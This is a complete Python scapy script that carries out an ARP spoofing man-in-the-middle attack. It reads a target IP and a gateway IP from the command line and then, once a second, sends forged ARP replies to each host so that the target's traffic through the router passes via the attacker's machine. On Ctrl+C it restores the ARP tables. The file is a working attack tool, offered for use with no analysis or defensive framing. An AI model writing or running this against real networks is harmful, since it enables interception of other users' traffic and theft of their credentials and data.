import scapy.all as scapy
import time
import optparse


BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
ARP_RESPONSE = 2


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="target IP address to attack")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="IP address of the router")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify a target IP to attack, use --help for more info")
    elif not options.gateway_ip:
        parser.error("[-] Please specify a router gateway IP, use --help for more info")
    else:
        return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst=BROADCAST_MAC)
    arp_broadcast_packet = broadcast/arp_request
    answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=ARP_RESPONSE, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore_arp_table(dest_ip, src_ip):
    packet = scapy.ARP(op=ARP_RESPONSE, pdst=dest_ip, hwdst=get_mac(dest_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
    scapy.send(packet, count=4, verbose=False)


def main():
    opts = get_arguments()
    try:
        sent_packets_count = 0
        while True:
            spoof(opts.target_ip, opts.gateway_ip)
            spoof(opts.gateway_ip, opts.target_ip)
            sent_packets_count += 2
            print("\r[+] Packets sent: ", sent_packets_count, end="")
            time.sleep(1)
    except KeyboardInterrupt as kie:
        print("\n[-] Detected Ctrl+C ... Stopping attack.")
        restore_arp_table(opts.target_ip, opts.gateway_ip)
        restore_arp_table(opts.gateway_ip, opts.target_ip)


if __name__ == "__main__":
    main()
